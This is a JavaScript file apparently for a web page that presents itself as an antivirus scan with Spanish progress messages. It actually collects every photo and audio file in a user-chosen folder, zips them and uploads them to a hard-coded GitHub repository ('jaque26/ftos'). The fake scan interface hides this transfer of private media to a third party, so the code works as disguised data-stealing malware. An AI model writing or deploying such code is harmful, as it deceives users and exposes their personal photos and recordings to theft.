let startTime;
let totalBatches;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');
    
    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;
    
    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;
    
    try {
        const token = prompt('🔑 CLAVE DE ACCESO:');
        if (!token?.startsWith('ghp_')) {
            alert('❌ CLAVE NO VALIDA');
            return;
        }

        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);
        
        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();
                
                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos');
                updateStatus(`Elementos detectados: ${files.length}`, 40);

                updateStatus('Comprimiendo datos...', 50);
                const zipBatches = await createZipBatches(files);
                totalBatches = zipBatches.length;
                
                updateStatus('Iniciando protocolo seguro...', 70);
                await processBatches(zipBatches, token);
                
                updateStatus('✅ OPERACIÓN EXITOSA', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);
        
    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') {
            const fileName = entry.name.toLowerCase();
            // Filtrar solo fotos y audios, excluir videos
            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') || 
                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                files.push(entry);
            }
        } else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function createZipBatches(files) {
    const maxSize = 40 * 1024 * 1024; // 40 MB en bytes
    const batches = [];
    let currentBatch = new JSZip();
    let currentSize = 0;
    
    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const fileData = await file.getFile();
        const fileSize = fileData.size;

        if (currentSize + fileSize > maxSize && currentBatch.fileCount > 0) {
            const zipBlob = await currentBatch.generateAsync({ type: 'blob' });
            if (zipBlob.size <= maxSize) {
                batches.push(currentBatch);
            } else {
                alert(`El zip generado excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
            }
            currentBatch = new JSZip();
            currentSize = 0;
        }

        currentBatch.file(file.name, await fileData.arrayBuffer());
        currentSize += fileSize;

        if (i === files.length - 1 && currentSize > 0) {
            const zipBlob = await currentBatch.generateAsync({ type: 'blob' });
            if (zipBlob.size <= maxSize) {
                batches.push(currentBatch);
            } else {
                alert(`El zip final excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB) y será omitido`);
            }
        }
    }
    return batches;
}

async function processBatches(batches, token) {
    localStorage.removeItem('batchesProgress');
    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;

    for (let index = startIndex; index < batches.length; index++) {
        const batchStartTime = Date.now();
        try {
            const progress = 70 + Math.floor(((index + 1)/batches.length)*30);
            updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
            
            const zipBlob = await batches[index].generateAsync({ type: 'blob' });
            if (zipBlob.size > 40 * 1024 * 1024) {
                throw new Error(`El zip ${index} excede 40 MB (${(zipBlob.size / 1024 / 1024).toFixed(2)} MB)`);
            }
            await uploadZip(zipBlob, `secure-${Date.now()}-${index}.zip`, token);
            
            localStorage.setItem('lastProcessedIndex', index.toString());
            
            const batchTime = (Date.now() - batchStartTime) / 1000;
            const uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;

        } catch (error) {
            localStorage.setItem('lastProcessedIndex', index.toString());
            throw error;
        }
    }
    localStorage.removeItem('lastProcessedIndex');
}

async function uploadZip(blob, zipName, token) {
    const repo = 'jaque26/ftos';
    const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
        method: 'PUT',
        headers: { 
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
            message: 'Backup automático', 
            content: await blobToBase64(blob)
        })
    });

    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Error en subida');
    }
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}
